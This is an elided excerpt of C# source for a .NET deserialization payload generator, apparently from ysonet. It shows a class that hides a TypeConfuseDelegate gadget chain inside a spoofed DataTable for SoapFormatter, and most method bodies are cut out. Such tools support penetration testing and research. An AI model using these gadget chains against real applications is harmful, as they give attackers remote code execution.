...
namespace ysonet.Generators
{
     ...
     *   Variant 2: TypeConfuseDelegate, a framework built-in inner. SoapFormatter uses
     *     generation-only aliases inside the table and exposes the native CLR4
     *     SortedSet/ComparisonComparer graph to the target.
     *
    ...
    public class DataTableTypeSpoofGenerator : GenericGenerator
    {
        private const string SoapSetAliasNamespace =
            "YsonetDataTableTypeSpoofTcdSoapSetProxy";
        private const string SoapSetAliasType = "YsonetDataTableTypeSpoofTcdSetAlias";
        private const string SoapComparerAliasNamespace =
            "YsonetDataTableTypeSpoofTcdSoapComparerProxy";
        private const string SoapComparerAliasType =
            "YsonetDataTableTypeSpoofTcdComparerAlias";
        ...
        public override List<string> SupportedFormatters()
        {
            ...
            // variants". All three carry both inner gadgets.
            return new List<string>
            {
        ...
        public override object Generate(string formatter, InputArgs inputArgs)
        {
            ...
            if (variant_number == 2
                ...
                return SerializeSoapTcdSpoof(inputArgs);
        ...
        // ---- Direct SOAP form of the TCD-in-spoofed-DataTable graph ----------

        // The outer marshal still writes DataTable's real SerializationInfo and changes
        // only its root identity. The nested aliases exist solely to get the closed-generic
        // TCD object through SoapFormatter's writer; neither alias survives the structural
        // XML-name replacement below.
        private object SerializeSoapTcdSpoof(InputArgs inputArgs)
        {
            ...
            DataTableTypeSpoofMarshal root = new DataTableTypeSpoofMarshal(
                table, target_type, target_assembly);
            string payload;
